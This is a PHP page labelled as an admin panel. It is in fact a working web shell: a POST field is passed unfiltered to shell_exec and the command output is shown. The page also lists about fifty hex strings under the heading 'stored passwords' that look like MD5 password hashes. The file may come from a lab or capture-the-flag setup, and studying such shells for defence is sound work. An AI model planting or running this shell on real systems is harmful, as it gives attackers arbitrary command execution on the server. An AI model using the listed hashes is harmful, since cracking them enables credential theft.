<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html>
<!-- By Artyum (https://github.com/artyuum) -->
<head>

    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">

    <title>Admin panel</title>

    <style>
        h2 {
            color: rgba(0, 0, 0, .75);
        }
        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #ECF0F1;
        }
        .container {
            width: 850px;
        }
    </style>

</head>

<body>
    <h2> Panel de administraci&oacute;n</h2>
    <div class="container">

        <div class="pb-2 mt-4 mb-2">
            <h2> Execute a command </h2>
        </div>

        <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>

<?php if ($cmd): ?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre><small>No result.</small></pre>
<?php endif; ?>
    </div>
    <div class="container pb-2 mt-4 mb-2"><h3>Contrase&ntilde;as almacenadas</h3>
18dc56819d8d71b3dc4ee0e224f1f70d<br>
64b6523c655707e0c91fa565bc1cab02<br>
5cf910ac690282574f5f79bc457b3a54<br>
b7c39fa6b76e01702162104c563392bc<br>
921f7b55d349616b1c665fda6b3a6472<br>
631313cb2d96d5b97dd92116e8204fdd<br>
4ef0a915751a578a0c41195502347724<br>
db98fa9332ad7a8735a81dfae95df86a<br>
6f561fff267b09c89e6881c7a75cc76b<br>
795931feef2411e7b99e69868a1cd75a<br>
7bafc7ec3f20ffb263f4e89968905cb0<br>
26c5231f709116e0892e7622aded35e2<br>
e632b7764955dd8f5a896bd1b23bc0d8<br>
30b197eaea44450acd5b2035aa836f1a<br>
4ba80c91c7d33b1670012b943406fb21<br>
84392e1fdfb43e826db8ce24d86485bc<br>
6f6ed72fefac374f4cfc9fe0ed4c298c<br>
5c20baa81b83ef319767e2b7e8c114fc<br>
a6afbeb1d051bbff1b6abf73ef77449a<br>
677bc1d39cdac28acd6bbb4078b771c1<br>
7e5eee855a3da27b7b1941cf9f926b19<br>
f87020689861ee9f2352151b5b8562bb<br>
b9ff67e8f9022b028510149703aebf92<br>
292b466f9e1b9fbbd74e4225caf71cd6<br>
ca3a0b1d7969e1739422457e882011c0<br>
2c30085a58cc48385239606be3821aca<br>
74300d0cedf05491560f4c583b7004ba<br>
0cf0451efed978da0c0e34eeecaaa1d1<br>
b057b51e2e2447babdd5bc8c0e183e1b<br>
ea62cc3c051035eb23a29cfc941b09ff<br>
3f9adc858f8f9327bc64afe370f3eedb<br>
19a4003a3c5d06ad02c07d9fb0d324b8<br>
480a4ad6a0316ee2ba2b3593f4416549<br>
8a9d90c42588f16859d326b334c43b71<br>
9fefb9c3886e3fb1abf4ba5b6fbcfe67<br>
fe63aed388c51be998fe79f7f2bf3dda<br>
81621c77d977f8c5df9e11a4cab9db8f<br>
eeec1be2365108b69348912a3ad1376a<br>
f0fd9d8f1b4264f2dc4ef1424e5143de<br>
0c09ddb70ac3ad025deaf2d7e018dd7b<br>
a6cf8097720fbb7233e1d2cd4e238b89<br>
9216ccf1fc21ee7b444438396563f162<br>
480b6bb1716cd28ad5ab9a00f4dc12ac<br>
5dcb68165ea9dd15c079119679419cdd<br>
fa13517ed1886b9ae96f35e01b76bf63<br>
2dc63a296ec2829952f739d0aa991a58<br>
77db0dc2a9490840e7a9398f5a71e623<br>
71325b4578bc3088101244276dd89a04<br>
b2971f7815c9b159449bbb419e4d3051<br>
9d9e14e94f462ccbd59ed18b6cb933f4
</div>
</body>

</html>
